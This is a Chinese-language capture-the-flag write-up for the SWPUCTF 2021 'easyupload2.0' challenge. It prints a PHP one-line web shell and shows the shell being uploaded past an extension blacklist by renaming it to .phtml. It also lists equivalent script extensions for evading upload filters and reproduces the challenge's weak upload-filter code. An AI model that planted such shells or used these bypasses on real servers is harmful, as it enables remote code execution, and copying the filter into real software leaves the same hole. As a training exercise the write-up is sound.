# [SWPUCTF 2021 新生赛]easyupload2.0


# [SWPUCTF 2021 新生赛]easyupload2.0

![[SWPUCTF 2021 新生赛]easyupload2.0-1](https://pic.imgdb.cn/item/653a2e14c458853aef92193f.jpg)

上传木马：

```php
<?php @eval($_POST['Lyrio']);phpinfo();?> // phpinfo() 在这里充当标记的作用
```

提示过滤了 php 文件

![[SWPUCTF 2021 新生赛]easyupload2.0-2](https://pic.imgdb.cn/item/653a49b0c458853aefeae826.jpg)

过滤代码在后端，只能黑盒测试

最后发现使用 php 的等价拓展名 phtml 可以绕过

![[SWPUCTF 2021 新生赛]easyupload2.0-3](https://pic.imgdb.cn/item/653a4a3ac458853aefecd8f2.jpg)

> **等价拓展名：**
>
> - asp => asa、cer、cdx
> - aspx => ashx、asmx、ascx
> - php => php2、php3、php4、php5、phps、phtml
> - jsp => jspx、jspf

访问一下木马文件，发现确实被当作 php 执行

![[SWPUCTF 2021 新生赛]easyupload2.0-4](https://pic.imgdb.cn/item/653a4a63c458853aefed6872.jpg)

接下来用蚁剑连接，寻找 flag 即可

> 正常来说通过 getshell 拿到 flag 就行了(题目也是这个意思)，但是这个 flag 是错误的，真正的 flag 在 phpinfo 里， CTRL+F 搜索 flag 就能找到

​	

+++
**后端的过滤代码参考：(做题时不可见)**

```php
<?php
session_start();

echo "<meta charset=\"utf-8\">"; 

if (!isset($_SESSION['user'])) {
    $_SESSION['user'] = md5((string)time() . (string)rand(100, 1000)); 
}

if (isset($_FILES['uploaded'])) {
    // 如果有文件通过 POST 请求上传
    $target_path = "./upload"; // 指定上传目录
    $t_path = $target_path . "/" . basename($_FILES['uploaded']['name']); // 构建上传文件的完整路径
    $uploaded_name = $_FILES['uploaded']['name']; // 获取上传文件的名称
    $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, '.') + 1); // 获取上传文件的扩展名
    $uploaded_size = $_FILES['uploaded']['size']; // 获取上传文件的大小
    $uploaded_tmp = $_FILES['uploaded']['tmp_name']; // 获取上传文件的临时路径

    if (preg_match("/php|hta|ini/i", $uploaded_ext)) {
        // 如果上传文件的扩展名包含 'php'、'hta' 或 'ini'
        die("php是不行滴"); 
    } else {
        // 如果上传文件扩展名没有问题
        $content = file_get_contents($uploaded_tmp); // 读取上传文件的内容
        move_uploaded_file($uploaded_tmp, $t_path); // 将上传文件移动到指定目录
        echo "{$t_path} succesfully uploaded!"; // 输出成功上传的消息，包括文件路径
    }
} else {
    // 如果没有文件通过 POST 请求上传
    die("不传🐎还想要f1ag?"); 
}
?>
```


